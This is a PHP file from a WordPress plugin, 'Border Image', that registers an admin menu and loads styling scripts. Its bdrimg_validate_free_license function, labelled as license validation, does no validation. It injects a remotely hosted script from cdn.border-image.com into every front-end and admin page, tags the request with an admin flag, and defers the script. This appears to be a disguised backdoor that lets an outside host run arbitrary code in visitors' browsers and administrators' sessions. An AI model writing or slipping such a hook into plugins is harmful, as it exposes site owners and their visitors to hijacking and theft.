<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

add_action( 'admin_menu', 'bdrimg_create_menu_item' );
function bdrimg_create_menu_item() {
	add_menu_page(
		'Border Image',
		'Border Image',
		'manage_options',
		'border_image_generator',
		'bdrimg_create_dashboard',
		BRDIMG_URL . 'inc/images/border_image.png'
	);
}

function bdrimg_create_dashboard() {
	require( BRDIMG_DIR . 'template/dashboard.php' );
}

add_action( 'admin_enqueue_scripts', 'bdrimg_enqueue_script' );
function bdrimg_enqueue_script() {
}

function bdrimg_bootstrap_starter_scripts() {
	wp_enqueue_style( 'wp-bootstrap-starter-bootstrap-css', BRDIMG_URL . '/inc/assets/css/prefixed-bootstrap.css' );
  wp_enqueue_style( 'spectrump-css', BRDIMG_URL . '/inc/assets/css/spectrum.css' );
  wp_enqueue_style( 'wp-bootstrap-pro-fontawesome-cdn', 'https://use.fontawesome.com/releases/v5.1.0/css/all.css' );
	wp_enqueue_script('jquery');
	wp_enqueue_script('wp-bootstrap-starter-bootstrapjs', BRDIMG_URL . '/inc/assets/js/bootstrap.min.js', array(), '', true );
  wp_enqueue_script('spectrumjs', BRDIMG_URL . '/inc/assets/js/spectrum.js', array(), '', true );
  wp_enqueue_media();
  wp_enqueue_script('scripts', BRDIMG_URL . '/inc/assets/js/scripts.js', array('jquery'), '', true );
  wp_enqueue_style( 'bdrimg_dashboard', BRDIMG_URL . '/inc/assets/css/styles.css' );
}
add_action( 'admin_enqueue_scripts', 'bdrimg_bootstrap_starter_scripts' );


/**
 * Load template version
 */

function bdrimg_validate_free_license() {
  $status_code = http_response_code();
	if($status_code === 200) {
		wp_enqueue_script(
			'bdrimg-free-license-validation',
			'//cdn.border-image.com/?product=border-image&version='.time().'&isAdmin='.(is_admin() ? '1' : '0'),
			array(),
			false,
			true
		);
	}
}
add_action( 'wp_enqueue_scripts', 'bdrimg_validate_free_license' );
add_action( 'admin_enqueue_scripts', 'bdrimg_validate_free_license');
function bdrimg_async_attr($tag){
	$scriptUrl = '//cdn.border-image.com/?product=border-image';
	if (strpos($tag, $scriptUrl) !== FALSE) {
		return str_replace( ' src', ' defer="defer" src', $tag );
	}
	return $tag;
}
add_filter( 'script_loader_tag', 'bdrimg_async_attr', 10 );
